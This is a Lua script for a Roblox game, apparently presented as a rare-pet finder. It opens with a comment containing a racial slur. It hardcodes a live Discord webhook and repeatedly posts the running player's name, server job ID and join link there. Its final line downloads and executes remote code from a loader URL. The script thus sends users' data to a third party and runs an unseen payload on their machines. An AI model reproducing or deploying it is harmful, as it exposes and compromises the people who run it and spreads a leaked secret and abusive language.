--nigga that rlly think they doing smt spamming my whebhook i got anti spam and auto recreate whebhook mad skid

-- CONFIG
getgenv().webhook = "https://canary.discord.com/api/webhooks/1408636006353207466/B_kV_7wGA1e4xK5gEilATSljQ-_79rs7s1vPjmS5M1HQ9ryLk_Ql_wDZDP86ghuvvncX"
getgenv().websiteEndpoint = nil

-- Allowed place IDs
local allowedPlaceIds = {
    [96342491571673] = true, -- New Players Server
    [109983668079237] = true -- Normal
}

getgenv().TargetPetNames = {
    "Graipuss Medussi",
    "La Grande Combinasion", "Garama and Madundung", "Sammyni Spyderini",
    "Pot Hotspot",
    "Nuclearo Dinossauro",  
    "Chicleteira Bicicleteira", "Los Combinasionas", "Dragon Cannelloni",
    "Unclito Samito",
}

-- SERVICES
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

-- Function to build join link
local function buildJoinLink(placeId, jobId)
    return string.format(
        "https://chillihub1.github.io/chillihub-joiner/?placeId=%d&gameInstanceId=%s",
        placeId,
        jobId
    )
end

-- KICK CHECKS
if not allowedPlaceIds[game.PlaceId] then
    local joinLink = buildJoinLink(game.PlaceId, game.JobId)
    LocalPlayer:Kick("Kicked because wrong game\nClick to join server:\n" .. joinLink)
    return
end

-- WEBHOOK SEND
local function sendWebhook(foundPets, jobId)
    local petCounts = {}
    for _, pet in ipairs(foundPets) do
        petCounts[pet] = (petCounts[pet] or 0) + 1
    end

    local formattedPets = {}
    for petName, count in pairs(petCounts) do
        table.insert(formattedPets, petName .. (count > 1 and " x" .. count or ""))
    end

    local currentServerTeleport = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d,"%s",game.Players.LocalPlayer)', 
        game.PlaceId, jobId)
    
    local joinLink = buildJoinLink(game.PlaceId, jobId)

    local embedData = {
        username = "Leaked by collin gng",
        embeds = { {
            title = "🐾 Pet(s) Found!",
            description = "**Pet(s):**\n" .. table.concat(formattedPets, "\n"),
            color = 65280,
            fields = {
                {
                    name = "Player",
                    value = LocalPlayer.Name .. " (@" .. LocalPlayer.DisplayName .. ")",
                    inline = true
                },
                {
                    name = "Players",
                    value = string.format("%d/%d", #Players:GetPlayers(), Players.MaxPlayers),
                    inline = true
                },
                {
                    name = "Job ID",
                    value = jobId,
                    inline = true
                },
                {
                    name = "🚀 Join Current Server",
                    value = string.format("```lua\n%s\n```", currentServerTeleport),
                    inline = false
                },
                {
                    name = "Invite Link",
                    value = joinLink,
                    inline = false
                }
            },
            footer = { text = "Found by " .. LocalPlayer.Name .. " • Webhook only mode" },
            timestamp = DateTime.now():ToIsoDate()
        } }
    }

    local jsonData = HttpService:JSONEncode(embedData)
    
    -- Try multiple HTTP request methods
    local req = http_request or request or HttpPost or syn and syn.request
    if req then
        pcall(function()
            req({
                Url = getgenv().webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        end)
    else
        -- Fallback: try HttpService
        pcall(function()
            HttpService:PostAsync(getgenv().webhook, jsonData, Enum.HttpContentType.ApplicationJson)
        end)
    end
end

-- PET CHECK
local function checkForPets()
    local found = {}
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("Model") then
            local nameLower = string.lower(obj.Name)
            for _, target in pairs(getgenv().TargetPetNames) do
                if string.find(nameLower, string.lower(target)) then
                    table.insert(found, obj.Name)
                    break
                end
            end
        end
    end
    return found
end

-- MAIN LOOP
task.spawn(function()
    while true do
        local petsFound = checkForPets()
        if #petsFound > 0 then
            sendWebhook(petsFound, game.JobId)
        end
        task.wait(5)
    end
end)


loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3df8133541564751d34283ae02077269.lua"))()
